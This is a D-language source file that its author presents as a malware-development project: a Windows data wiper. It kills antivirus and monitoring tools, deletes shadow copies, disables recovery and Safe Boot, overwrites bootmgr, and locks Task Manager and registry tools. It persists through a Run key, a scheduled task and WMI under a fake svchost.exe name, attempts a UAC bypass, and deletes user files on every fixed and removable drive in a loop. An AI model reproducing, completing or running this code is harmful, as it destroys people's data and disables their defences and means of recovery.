pragma(lib, "user32");
/**
This was my project to get more into AV evasion and malware dev.
Terminates AV processes, disables Safe Boot/recovery, wipes user data, but leaves PC bootable.
I have been working on this for quite a long while, around a couple of months.
*/

import core.sys.windows.windows;
import core.sys.windows.winuser;
import std.file;
import std.path;
import std.process;
import std.random;
import std.parallelism;
import std.string;
import std.conv;
import std.algorithm : canFind;
import core.thread;
import std.datetime : msecs;

static immutable AVProcesses = [
    "MsMpEng.exe", "avp.exe", "avg.exe", "avguard.exe", "egui.exe",
    "avastui.exe", "mcshield.exe", "windefend.exe", "taskmgr.exe",
    "procmon.exe", "procexp.exe"
];

enum REG_TASKMGR = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
enum REG_SAFEBOOT = "HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot";
enum REG_RECOVERY = "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon";
enum REG_RUN = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";
enum CSIDL_STARTUP = 0x0007;
enum WINDOWS_PATH = `C:\Windows`;
enum SYSTEM32_PATH = `C:\Windows\System32`;
static immutable BOOT_FILES = [
    "bootmgr", "BOOTNXT", "ntldr", "winload.exe", "winresume.exe", "bcd"
];
static immutable REGISTRY_HIVES = [
    "C:\\Windows\\System32\\config\\SAM",
    "C:\\Windows\\System32\\config\\SYSTEM",
    "C:\\Windows\\System32\\config\\SECURITY",
    "C:\\Windows\\System32\\config\\SOFTWARE",
    "C:\\Windows\\System32\\config\\DEFAULT",
    "C:\\Windows\\System32\\config\\userdiff"
];

// Remove file instantly, ignore errors
void fastDelete(string path)
{
    try
    {
        remove(path);
    }
    catch (Exception)
    {
    }
}

// Gather non-system files in a directory tree
void collectUserFiles(string root, ref string[] files)
{
    foreach (e; dirEntries(root, SpanMode.depth))
    {
        if (e.isFile &&
            !e.name.startsWith(WINDOWS_PATH) &&
            !e.name.startsWith(SYSTEM32_PATH) &&
            !BOOT_FILES.canFind(baseName(e.name)) &&
            !REGISTRY_HIVES.canFind(e.name))
        {
            files ~= e.name;
        }
    }
}

// Delete all files in a directory (parallel and safe)
void deleteFolderFiles(string root)
{
    string[] files;
    collectUserFiles(root, files);
    foreach (f; files)
    {
        auto t = new Thread({ fastDelete(f); });
        t.start();
    }
    disableSystemRestore();
}

// Helper to run shell commands
void runShell(string cmd)
{
    spawnProcess(["cmd", "/c", cmd]);
}

// Remove recovery files and disable Windows recovery
void blockRecovery()
{
    runShell("reagentc /disable");
    runShell("del /F /Q C:\\Windows\\System32\\Recovery\\Winre.wim");
}

// Disable system restore and shadow copies
void disableSystemRestore()
{
    runShell("vssadmin delete shadows /all /quiet");
    runShell("wmic shadowcopy delete");
}

// Sabotage BCD (does not brick system)
void sabotageBCD()
{
    runShell("bcdedit /set {default} safeboot minimal");
    runShell("bcdedit /deletevalue {default} recoveryenabled");
    runShell("attrib +h +s C:\\bootmgr");
    runShell("echo 00 > C:\\bootmgr");
}

// Lock registry to keep Task Manager and recovery disabled
void lockRegistry()
{
    runShell("reg add \"" ~ REG_TASKMGR ~ "\" /v \"DisableTaskMgr\" /t REG_DWORD /d 1 /f >nul 2>&1");
    runShell("reg add \"" ~ REG_SAFEBOOT ~ "\" /v \"Option\" /t REG_DWORD /d 0 /f >nul 2>&1");
    runShell(
        "reg add \"" ~ REG_RECOVERY ~ "\" /v \"AutoRestartShell\" /t REG_DWORD /d 0 /f >nul 2>&1");
    runShell(
        "reg add \"" ~ REG_TASKMGR ~ "\" /v \"DisableRegistryTools\" /t REG_DWORD /d 1 /f >nul 2>&1");
}

// Set up startup, scheduled task, and WMI persistence
void setPersistence(string exePath)
{
    string startup = buildPath(getStartupFolder(), "svchost.exe");
    if (!exists(startup))
        copy(exePath, startup);

    runShell(
        "reg add \"" ~ REG_RUN ~ "\" /v \"SystemHost\" /t REG_SZ /d \"" ~ startup ~ "\" /f >nul 2>&1");
    runShell("schtasks /create /tn \"SystemHost\" /tr \"" ~ startup ~ "\" /sc onlogon /rl highest /f");
    runShell("powershell -Command \"Set-WmiInstance -Class Win32_StartUpCommand "
            ~ "-Arguments @{Name='SystemHost'; Command='" ~ startup ~ "'}\"");
}

// Get the path to Startup folder (fallback to env var for simplicity)
string getStartupFolder()
{
    return environment.get("APPDATA", "") ~ "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
}

// Spawn multiple watchdog processes for persistence
void spawnWatchdogs(int n = 24)
{
    foreach (i; 0 .. n)
    {
        spawnProcess([thisExePath()]);
    }
}

// Attempt privilege escalation
void escalatePrivileges()
{
    runShell("powershell -Command \"Start-Process -Verb runAs -FilePath '" ~ thisExePath() ~ "'\"");
    runShell("cmd /c start fodhelper.exe");
}

// Get all drives except system reserved
string[] getDrives()
{
    string[] drives;
    DWORD mask = GetLogicalDrives();
    foreach (i; 0 .. 26)
    {
        if (mask & (1 << i))
        {
            char driveLetter = cast(char)('A' + i);
            string drive = driveLetter ~ ":\\";
            UINT type = GetDriveTypeA(toStringz(drive));
            if (type == DRIVE_FIXED || type == DRIVE_REMOVABLE)
            {
                drives ~= drive;
            }
        }
    }
    return drives;
}

// Get path to current executable
string thisExePath()
{
    char[MAX_PATH] buf;
    GetModuleFileNameA(null, buf.ptr, MAX_PATH);
    size_t zeroIdx = 0;
    foreach (i, b; buf)
    {
        if (b == '\0')
        {
            zeroIdx = i;
            break;
        }
    }
    return buf[0 .. zeroIdx].idup;
}

// Hide console window for stealth
void hideWindow()
{
    HWND hwnd = GetConsoleWindow();
    if (hwnd !is null)
        ShowWindow(hwnd, SW_HIDE);
}

// Set process priority low for stealth
void setLowPriority()
{
    HANDLE hProc = GetCurrentProcess();
    SetPriorityClass(hProc, BELOW_NORMAL_PRIORITY_CLASS);
}

// Gather all user profile folders typically containing data
string[] userFolders()
{
    string[] folders;
    string usersRoot = "C:\\Users";
    if (exists(usersRoot))
    {
        foreach (userDir; dirEntries(usersRoot, SpanMode.shallow))
        {
            if (userDir.isDir)
            {
                foreach (folder; [
                        "Documents", "Downloads", "Desktop", "Pictures", "Videos",
                        "Music"
                    ])
                {
                    auto path = buildPath(userDir.name, folder);
                    if (exists(path))
                        folders ~= path;
                }
            }
        }
    }
    return folders;
}

// Kill AV and monitoring processes
void cleanAVProcesses()
{
    foreach (name; AVProcesses)
    {
        runShell("taskkill /F /IM " ~ name ~ " >nul 2>&1");
    }
}

void main()
{
    hideWindow();
    setLowPriority();

    auto exePath = thisExePath();

    new Thread(&sabotageBCD).start();
    new Thread(&blockRecovery).start();
    new Thread(&lockRegistry).start();
    new Thread(&disableSystemRestore).start();
    spawnWatchdogs();
    new Thread(&cleanAVProcesses).start();
    new Thread({ setPersistence(exePath); }).start();
    new Thread(&escalatePrivileges).start();

    foreach (folder; userFolders())
    {
        new Thread({ deleteFolderFiles(folder); }).start();
    }
    foreach (drive; getDrives())
    {
        foreach (entry; dirEntries(drive, SpanMode.shallow))
        {
            if (entry.isDir &&
                !entry.name.startsWith(WINDOWS_PATH) &&
                !entry.name.startsWith(SYSTEM32_PATH) &&
                !BOOT_FILES.canFind(baseName(entry.name)) &&
                !REGISTRY_HIVES.canFind(entry.name))
            {
                new Thread({ deleteFolderFiles(entry.name); }).start();
            }
        }
    }

    // Fast persistence/clean/lock loop
    while (true)
    {
        new Thread(&cleanAVProcesses).start();
        new Thread(&lockRegistry).start();
        new Thread({ setPersistence(exePath); }).start();
        Thread.sleep(msecs(10));
    }
}
// Don't be a dick with this.
